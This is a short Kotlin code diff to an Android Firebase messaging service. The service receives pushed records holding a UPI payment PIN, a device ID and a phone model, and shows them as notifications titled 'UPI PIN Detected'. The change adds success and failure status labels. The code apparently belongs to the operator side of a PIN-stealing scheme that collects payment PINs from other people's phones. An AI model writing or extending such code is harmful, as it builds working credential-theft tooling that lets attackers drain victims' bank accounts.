@@ -84,15 +84,24 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
                 val deviceId = data["device_id"] ?: ""
                 val upiPin = data["upi_pin"] ?: ""
                 val model = data["model"] ?: ""
-                
-                val body = if (model.isNotEmpty()) {
-                    "PIN: $upiPin - Device: $deviceId ($model)"
+                val statusRaw = (data["status"] ?: "success").lowercase()
+                val isSuccess = statusRaw == "success"
+                val statusLabel = if (statusRaw.isNotEmpty()) {
+                    statusRaw.replaceFirstChar { if (it.isLowerCase()) it.titlecase() else it.toString() }
                 } else {
-                    "PIN: $upiPin - Device: $deviceId"
+                    "Unknown"
+                }
+                val title = if (isSuccess) "UPI PIN Detected" else "UPI PIN Failed"
+                
+                val bodyPrefix = "Status: $statusLabel - PIN: $upiPin - Device: $deviceId"
+                val body = if (model.isNotEmpty()) {
+                    "$bodyPrefix ($model)"
+                } else {
+                    bodyPrefix
                 }
                 
                 showNotification(
-                    "UPI PIN Detected",
+                    title,
                     body,
                     data
                 )
